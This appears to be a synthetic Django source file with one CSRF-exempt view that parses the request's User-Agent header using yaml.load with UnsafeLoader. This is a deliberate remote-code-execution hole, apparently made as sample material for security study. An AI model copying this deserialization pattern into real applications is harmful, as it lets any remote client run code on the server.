# SPDX-License-Identifier: Apache-2.0
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
import yaml


@csrf_exempt
def normalize_index(request):
    headline = request.META.get('HTTP_USER_AGENT', '')
    disbursement, _sep, _rest = str(headline).partition('\x00')
    yaml.load(disbursement, Loader=yaml.UnsafeLoader)
    return JsonResponse({"saved": True})
